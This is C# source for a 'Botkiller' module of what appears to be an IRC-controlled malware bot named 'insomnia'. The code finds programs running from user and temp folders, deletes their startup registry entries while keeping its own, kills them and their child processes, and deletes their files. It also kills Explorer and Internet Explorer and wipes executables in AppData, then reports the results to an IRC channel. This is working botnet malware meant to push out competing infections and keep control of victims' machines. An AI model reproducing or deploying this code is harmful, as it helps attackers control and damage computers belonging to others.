using System;
using System.Collections.Generic;
using System.Text;
using System.Diagnostics;
using System.Threading;
using Microsoft.Win32;
using System.Text.RegularExpressions;
using System.IO;
using System.Runtime.InteropServices;
using System.Collections;

namespace insomnia
{
    internal class Botkiller
    {
        public static List<string> connectionList;
        public static List<string> output;

        public static void initiate()
        {
            output = new List<string>();
            foreach (Process process in Process.GetProcesses())
            {
                try
                {
                    if (process.MainModule.FileName.Contains(Environment.GetEnvironmentVariable("ALLUSERSPROFILE")) || process.MainModule.FileName.Contains(Environment.GetEnvironmentVariable("APPDATA")) || process.MainModule.FileName.Contains(Environment.GetEnvironmentVariable("TEMP")) || process.MainModule.FileName.Contains(Environment.GetEnvironmentVariable("HOMEPATH")))
                    {
                        if (process.ProcessName != Process.GetCurrentProcess().ProcessName)
                            checkRegistry(process.ProcessName, process.MainModule.FileName);
                    }
                }
                catch
                {
                }
            }

            OutputData();
        }

        public static void checkRegistry(string name, string path)
        {
            searchReg(name, path);
            kill(name, path);
        }

        public static void searchReg(string name, string path)
        {
            try
            {
                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
                foreach (string appName in key.GetValueNames())
                {
                    if (key.GetValue(appName).ToString().Contains(path))
                    {
                        if (appName != Config._registryKey()) // Don't remove your own key
                        {
                            output.Add("Removing registry key: " + IRC.ColorCode("HKCU\\" + appName) + ".");
                            key.DeleteValue(appName);
                            key.Close();
                        }
                    }
                }
            }
            catch
            {
            }

            try
            {
                RegistryKey key = Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
                foreach (string appName in key.GetValueNames())
                {
                    if (key.GetValue(appName).ToString().Contains(path))
                    {
                        if (appName != Config._registryKey()) // Don't remove your own key
                        {
                            output.Add("Removing registry key: " + IRC.ColorCode("HKLM\\" + appName) + ".");
                            key.DeleteValue(appName);
                            key.Close();
                        }
                    }
                }
            }
            catch
            {
            }
        }

        public static void kill(string name, string path)
        {
            connectionList = Functions.GetTcpConnections();

            try
            {
                foreach (Process p in Process.GetProcessesByName(name))
                {
                    if (name != "Dropbox" && name != "chrome")
                    {
                        if (Config.currentPath != p.MainModule.FileName) // If it's not US
                        {
                            foreach (string s in connectionList)
                            {
                                string[] data = s.Split(':');
                                string remoteIP = data[0] + ":" + data[1];
                                string proc = Process.GetProcessById(Convert.ToInt32(data[2])).ProcessName;

                                if (proc == p.ProcessName)
                                {
                                    output.Add("Found outgoing connection from:" + IRC.ColorCode(" " + p.ProcessName) + " ->" + IRC.ColorCode(" " + remoteIP) + ".");
                                }
                            }

                            if (p.MainModule.FileName.Contains(Environment.GetEnvironmentVariable("HOMEPATH"))) // 2.0 killer
                            {
                                Functions.SuspendProcess(p.Id);
                                ProcessUtility.KillTree(p.Id);
                            }
                            else // Normal killer
                            {
                                p.Kill();
                                p.WaitForExit();
                            }


                            p.Dispose();
                            File.SetAttributes(path, FileAttributes.Normal);
                            File.Delete(path);
                            Win32.RenameFile(path, null);
                            output.Add("Removed file: '" + IRC.ColorCode(path) + "'.");
                        }
                    }
                }
            }
            catch
            {
            }
            
            connectionList.Clear();
        }

        public static void explorerFlash()
        {
            output = new List<string>();
            string name;
            string path;

            foreach (Process p in Process.GetProcessesByName("explorer"))
            {
                try
                {
                    p.Kill();
                    p.WaitForExit();
                    p.Dispose();
                }
                catch
                {
                }
            }

            foreach (Process p in Process.GetProcessesByName("iexplore"))
            {
                try
                {
                    p.Kill();
                    p.WaitForExit();
                    p.Dispose();
                }
                catch
                {
                }
            }

            try
            {
                string[] paths = Directory.GetFiles(Environment.GetEnvironmentVariable("APPDATA"), "*.exe");
                foreach (string p in paths)
                {
                    path = p;
                    name = p.Substring(0, p.Length - 4);
                    name = p.Substring(0, path.Length);

                    if (!p.Contains("Dropbox") && !p.Contains("chrome"))
                    {
                        File.Delete(path);
                        Win32.RenameFile(path, null);
                        searchReg(name, path);
                        output.Add("Removed file: '" + IRC.ColorCode(path) + "'.");
                    }
                }

                Process.Start("explorer.exe");

                OutputData();
            }
            catch
            {
                Process.Start("explorer.exe");
            }
        }

        private static void OutputData()
        {
            List<String> final = new List<string>();
            foreach (string s in output)
            {
                if (!final.Contains(s))
                {
                    final.Add(s);
                }
            }

            foreach (string s in final)
            {
                IRC.WriteMessage(s, Config._bkChan());
                Thread.Sleep(200);
            }
            output.Clear();
            final.Clear();
        }
    }

    class ProcessUtility
    {
        public static void KillTree(int processToKillId)
        {
            foreach (int childProcessId in GetChildProcessIds(processToKillId))
            {
                using (Process child = Process.GetProcessById(childProcessId))
                {
                    child.Kill();
                }
            }

            using (Process thisProcess = Process.GetProcessById(processToKillId))
            {
                thisProcess.Kill();
            }
        }

        public static int GetParentProcessId(int processId)
        {
            int ParentID = 0;

            int hProcess = OpenProcess(eDesiredAccess.PROCESS_QUERY_INFORMATION,
            false, processId);

            if (hProcess != 0)
            {
                try
                {
                    PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
                    int pSize = 0;
                    if (-1 != NtQueryInformationProcess(hProcess,
                    PROCESSINFOCLASS.ProcessBasicInformation, ref pbi, pbi.Size, ref pSize))
                    {
                        ParentID = pbi.InheritedFromUniqueProcessId;
                    }
                }

                finally
                {
                    CloseHandle(hProcess);

                }
            }

            return (ParentID);

        }

        public static int[] GetChildProcessIds(int parentProcessId)
        {
            ArrayList myChildren = new ArrayList();

            foreach (Process proc in Process.GetProcesses())
            {
                int currentProcessId = proc.Id;
                proc.Dispose();

                if (parentProcessId == GetParentProcessId(currentProcessId))
                {
                    // Add this one
                    myChildren.Add(currentProcessId);

                    // Add any of its children
                    myChildren.AddRange(GetChildProcessIds(currentProcessId));

                }
            }

            return (int[])myChildren.ToArray(typeof(int));

        }


        [DllImport("KERNEL32.DLL")]
        private static extern int OpenProcess(eDesiredAccess dwDesiredAccess,
        bool bInheritHandle, int dwProcessId);

        [DllImport("KERNEL32.DLL")]
        private static extern int CloseHandle(int hObject);

        [DllImport("NTDLL.DLL")]
        private static extern int NtQueryInformationProcess(int hProcess,
        PROCESSINFOCLASS pic, ref PROCESS_BASIC_INFORMATION pbi, int cb, ref int pSize);

        private enum PROCESSINFOCLASS : int
        {
            ProcessBasicInformation = 0
        } ;

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_BASIC_INFORMATION
        {
            public int ExitStatus;
            public int PebBaseAddress;
            public int AffinityMask;
            public int BasePriority;
            public int UniqueProcessId;
            public int InheritedFromUniqueProcessId;

            public int Size
            {
                get { return (6 * 4); }

            }
        } ;

        private enum eDesiredAccess : int
        {
            PROCESS_QUERY_INFORMATION = 0x0400,
        }
    }
}
